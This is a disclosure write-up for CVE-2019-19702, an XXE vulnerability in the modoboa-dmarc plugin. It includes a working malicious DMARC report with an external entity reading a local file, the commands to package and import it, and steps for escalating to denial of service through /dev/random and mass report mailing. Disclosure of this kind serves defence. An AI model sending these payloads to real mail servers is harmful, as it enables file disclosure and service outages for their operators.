# CVE-2019-19702: XXE injection in Modoboa DMARC plugin

The modoboa-dmarc plugin 1.1.0 for Modoboa [1] is vulnerable to an XML External Entity Injection (XXE) attack when processing XML data. A remote attacker could exploit this to perform a denial of service against the DMARC reporting functionality, such as by referencing the `/dev/random` file within XML documents that are emailed to the address in the rua field of the DMARC records of a domain [2].

## Reproducer
1. Use the following XML file containing a malicious DMARC aggregate report:

```
<!DOCTYPE foo [
	<!ENTITY xxe SYSTEM "file://etc/hostname" >
]
>

<feedback>
  <report_metadata>
    <org_name>ngyn</org_name>
    <email>abuse@163.com</email>
    <report_id>&xxe;</report_id>
    <date_range>
      <begin>1436054400</begin>
      <end>1436140799</end>
    </date_range>
  </report_metadata>
  <policy_published>
    <domain>ngyn.org</domain>
    <adkim>s</adkim>
    <aspf>s</aspf>
    <p>none</p>
    <sp>none</sp>
    <pct>5</pct>
  </policy_published>
  <record>
    <row>
      <source_ip>115.202.65.235</source_ip>
      <count>1</count>
      <policy_evaluated>
        <disposition>none</disposition>
        <dkim>fail</dkim>
        <spf>fail</spf>
      </policy_evaluated>
    </row>
    <identifiers>
      <header_from>u.ngyn.org</header_from>
    </identifiers>
    <auth_results>
      <spf>
        <domain>u.ngyn.org</domain>
        <result>none</result>
      </spf>
    </auth_results>
  </record>
</feedback>
```

Run the following to create a zip attachment

```
zip -r report.zip dmarc_report.xml && base64 report.zip 
```

Copy and paste the base64 encoding into one of the test reports, for example:

```
Return-Path: <abuse@163.com>
Delivered-To: <tonio@ngyn.org>
Received: from mail.koalabs.org
	by nelson.ngyn.org (Dovecot) with LMTP id IKPdD1ULmlXgLQAABvoInA
	for <tonio@ngyn.org>; Mon, 06 Jul 2015 07:00:05 +0200
Received: from localhost (localhost.localdomain [127.0.0.1])
	by mail.koalabs.org (Postfix) with ESMTP id 2645EE035B
	for <postmaster@ngyn.org>; Mon,  6 Jul 2015 07:00:05 +0200 (CEST)
X-Virus-Scanned: Debian amavisd-new at mail.koalabs.org
Received: from mail.koalabs.org ([127.0.0.1])
	by localhost (nelson.ngyn.org [127.0.0.1]) (amavisd-new, port 10024)
	with ESMTP for <postmaster@ngyn.org>;
	Mon,  6 Jul 2015 07:00:03 +0200 (CEST)
Received: from m12-181.163.com (m12-181.163.com [220.181.12.181])
	by mail.koalabs.org (Postfix) with ESMTP
	for <postmaster@ngyn.org>; Mon,  6 Jul 2015 06:59:54 +0200 (CEST)
Received: from 163.com (unknown [192.168.201.141])
	by mfast1 (Coremail) with SMTP id tcCowEAJixEvC5pVHJvvLg--.53754S2;
	Mon, 06 Jul 2015 12:59:27 +0800 (CST)
Content-Type: multipart/mixed; boundary="===============2544031943362770105=="
MIME-Version: 1.0
From: <abuse@163.com>
Date: Mon, 06 Jul 2015 12:59:25 +0800
Subject: Report Domain: ngyn.org Submitter: 163.com Report-ID:
 aggr_report_ngyn.org_20150705_163.com
To: postmaster@ngyn.org
X-CM-TRANSID:tcCowEAJixEvC5pVHJvvLg--.53754S2
Message-Id:<559A0B30.EBEE1F.29746@m12-181.163.com>
X-Coremail-Antispam: 1UD129KBjDUn29KB7ZKAUJUUUUU529EdanIXcx71UUUUU7v73
	VFW2AGmfu7bjvjm3AaLaJ3UjIYCTnIWjp_UUUnI7CY07I20VC2zVCF04k26cxKx2IYs7xG
	6rWj6s0DM28lY4IEw2IIxxk0rwA2F7IY1VAKz4vEj48ve4kI8wAa7VASzI0EjI02j7AqF2
	xKxVCjxxvEa2IrM2AIxVAIcxkEcVAq07x20xvEncxIr21le4C267I2x7xF54xIwI1l5I8C
	rVACY4xI64kE6c02F40Ex7xfMcIj6x8ErcxFaVAv8VWrMcvjeVCFs4IE7xkEbVWUJVW8Jw
	ACjcxG0xvEwIxGrwAKzVAC0xCFj2AI6cx7M4kE6xkIj40Ew7xC0wCjxxvEa2IrMxkIecxE
	wVCm-wCY0x0Ix7I2Y4AK64vIr41l42xK82IYc2Ij64vIr41l42xK82IY6x8ErcxFaVAv8V
	WrMxCjnVAqn7xvrwCFx2IqxVCFs4IE7xkEbVWUJVW8JwC20s026c02F40E14v26r1j6r18
	MI8I3I0E7480Y4vE14v26r106r1rMI8E67AF67kF1VAFwI0_Jr0_JrylIxkGc2Ij64vIr4
	1l6VACY4xI67k04243AbIYCTnIWIevJa73UjIFyTuYvjTRClkVDUUUU
X-Originating-IP: [192.168.201.141]
X-CM-SenderInfo: 5dex2vi6rwjhhfrp/

--===============2544031943362770105==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
This is a DMARC aggregate report for domain ngyn.org on 20150705. For more information please mail to abuse@163.com.
--===============2544031943362770105==
MIME-Version: 1.0
Content-Type: application/zip;
 name="163.com!ngyn.org!1436054400!1436140799.zip"
Content-Transfer-Encoding: base64
Content-Disposition: attachment;
 filename="163.com!ngyn.org!1436054400!1436140799.zip"
UEsDBBQAAAAIAGxn5kZGEGLBdAEAAJQDAAAqAAAAMTYzLmNvbSFuZ3luLm9yZyExNDM2MDU0NDAw
ITE0MzYxNDA3OTkueG1sbVNbbsMgEPzvKXICg5M4USSEehOEzdpBsQEBbpXbF4eHadovzOzs7Owu
JiOA6PnwoB+HA7FgtPVsAc8F93zDAqrtxBRfgLaXUzPohaCCRAIsXM6U96uDz8KJYCQkXSkonybL
0lVNT9VsUkfcdviKO1aS94QoENwAs1xNqWSAepikou35dMHd+YwxQRHJcVDiFW3P+Hq7BT8qi6Hf
aqVa3TYxepbDk5m1n6W7QzGiQ1uKZutBKwIxysVDLtQRFD8S6Mz4wrYzQoYqrYAgk+4uAy4jZvC0
C4RwvCz+ZyeMddA2O7P6u/Tu9GoHYNLQtu2aIz42l3CcguAeydxBr8rTlqD4keFUEL74vIZxiRzY
ZiCd0U56qVWyXSMVb5vBGF5BIJRxpH7HFCgzqZp8qxn2k1sjUoDycpRgXUm7Axdg2Wj1Qtdm30yN
J6E/6YSv/h7eo1tnvytWpvaV19L10tMD3xTSNNKltLXvHb2X28hxhwSVP/EHUEsBAhQDFAAAAAgA
bGfmRkYQYsF0AQAAlAMAACoAAAAAAAAAAAAAAKSBAAAAADE2My5jb20hbmd5bi5vcmchMTQzNjA1
NDQwMCExNDM2MTQwNzk5LnhtbFBLBQYAAAAAAQABAFgAAAC8AQAAAAA=
--===============2544031943362770105==--
```

2. Import the report on the Modoboa server

```
cat report.eml | python manage.py import_aggregated_report --pipe
```

This will trigger XML processing of the document.

## Impact

After running the commands above the database will be populated with the injected data. However, there is no way to view the injected data, for example via the web interface.
Another feasible attack is a denial of service against the DMARC reporting functionality. By substituting `file://etc/hostname` with `file://dev/random` in the XML document, will cause the import of the aggregated report to block while processing the XML document.

A remote attacker can send a number of such DMARC reports to the mail specified in the RUA attribute of the DNS records. This will block any legitimate DMARC reports to reach the RUA email and will be put in the mail queue. Eventually, it may reach, since postfix has a timeout mechanism that will abort the report import but depending on the postfix configuration and number of DoS mails sent it may take quite some time. Note that by default, postfix allows a maximum of 20 concurrent processes to parse the DMARC reports. This can be increased as described in the next attack.

Yet another possible attack is a variant of the previous one. This one can cause a DoS against the Modoboa application or even the hosting server. Given an instance of Modoboa hosting several domains, an attacker could send DMARC reports to each RUA addresses for all of the domains and this way trigger more concurrent processes. This attack can be reproduced by creating a few domains in the web interface and adding an entry for each domain to `/etc/postfix/dmarc_transport` (one domain and email per line). Following this, send a number of emails to each RUA and observe that the number of processes increase, as shown in Figure 1.

<p align="center">
  <img src="https://user-images.githubusercontent.com/197917/70522500-849e1c00-1b41-11ea-9a5b-ab420482c901.png" alt="Processes" width="75%" height="75%"/>
      <br /><em>Figure 1. Increasing number of processes</em>
</p>

Following this, the web application will become unresponsive, showing the following error message


<p align="center">
  <img src="https://user-images.githubusercontent.com/197917/70522744-04c48180-1b42-11ea-8ae7-7114d77e7dcb.png" alt="DoS" width="75%" height="75%"/>
      <br /><em>Figure 2. Denial of service against the web server</em>
</p>

The worst-case scenario is that the concurrent processes will consume all RAM on the hosting server.


## References
[1] Modoboa Email Server - https://modoboa.org/en/

[2] CVE-2019-19702 - https://nvd.nist.gov/vuln/detail/CVE-2019-19702
